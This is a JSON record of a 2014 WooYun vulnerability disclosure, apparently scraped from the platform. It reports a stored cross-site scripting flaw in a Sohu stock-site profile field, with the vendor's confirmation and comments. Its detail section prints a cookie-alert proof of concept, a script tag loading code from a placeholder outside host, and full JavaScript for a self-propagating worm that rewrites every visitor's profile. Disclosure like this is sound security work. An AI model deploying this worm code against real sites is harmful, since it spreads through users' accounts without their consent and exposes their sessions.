{"id": 2719, "wybug_id": "wooyun-2014-064120", "wybug_title": "搜狐某分站存储型跨站+蠕虫", "wybug_corp": "搜狐", "wybug_author": "Jack.HF", "wybug_date": "2014-06-09 09:56", "wybug_open_date": "2014-07-24 10:00", "wybug_type": "xss跨站脚本攻击", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["存储型", "蠕虫"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-06-09：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-06-09：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-06-19：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-06-29：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-07-09：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-07-24：\t细节向公众公开  简要描述： 感谢小xx将存储型跨站升级为蠕虫的提议，感谢magerx大牛的技术支持 详细说明：  1、首先，搜狐证券网这个站个人信息-签名这个位置存在存储型跨站。poc:</p><script>alert(document.cookie)</script>（下文中均以这段代码代替恶意代码）源码：\n\n现象：\n\n2、由于个人信息别的网友也能访问，因此可以将它改成一个蠕虫。poc:</p><script>alert(document.cookie)</script><script src=http://xxx.com/xxx.js>http://xxx.com/xxx.js\nvar request = false;if(window.XMLHttpRequest) {    request = new XMLHttpRequest();    if(request.overrideMimeType) {\trequest.overrideMimeType('text/xml');\t}}else if (window.ActiveXObject) {     var versions = ['Microsoft.XMLHTTP', 'MSXML.XMLHTTP', 'Microsoft.XMLHTTP', 'Msxml2.XMLHTTP.7.0','Msxml2.XMLHTTP.6.0','Msxml2.XMLHTTP.5.0', 'Msxml2.XMLHTTP.4.0', 'MSXML2.XMLHTTP.3.0', 'MSXML2.XMLHTTP'];    for(var i=0; i<versions.length; i++) {\ttry {\t    request = new ActiveXObject(versions);\t    }         catch(e) {}\t}}xmlhttp=request;var injectcode=escape('</p><script>alert(document.cookie)</script><script src=http://xxx.com/xxx.js>');var url= \"http://t.stock.sohu.com/updateuserinfo.up?callback=jQuery17209598822160122753_1402214482429&interest=%C6%DA%D6%B8&introduction=\"+injectcode;xmlhttp.open(\"GET\", url, true);  xmlhttp.setRequestHeader(\"Connection\", \"Keep-Alive\");xmlhttp.send();\n   漏洞证明：  被感染页面：http://t.stock.sohu.com/u/19424579/profile源码：\n\n现象：\n\n正常页面：http://t.stock.sohu.com/u/19426033/profile\n\n访问http://t.stock.sohu.com/u/19424579/profile后，再看自己主页，发现被感染：\n\n   修复方案：  过滤   版权声明：转载请注明来源 Jack.HF@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：10  确认时间：2014-06-09 10:24 厂商回复： 感谢对搜狐安全的支持。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-06-09 10:12 |    \t\t小川  \t\t\t( 核心白帽子 |\t\t\t        Rank:1344 漏洞数:216        | 一个致力要将乌云变成搞笑论坛的男人)\t\t \n  我的也可以蠕，但是不给审.......    \n     2014-06-09 10:13 |    \t\tBlue、Sky \t\t\t( 路人 |\t\t\t        Rank:5 漏洞数:1        | 纯新手、努力学习中)\t\t \n  围观    \n     2014-06-09 11:23 |    \t\tJack.HF \t\t\t( 路人 |\t\t\t        Rank:24 漏洞数:5        | 随便玩玩)\t\t \n  @小川 找xsser撒    \n     2014-06-09 11:23 |    \t\tJack.HF \t\t\t( 路人 |\t\t\t        Rank:24 漏洞数:5        | 随便玩玩)\t\t \n  @小川 我也还有几个没审    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 10, "Ranks": null}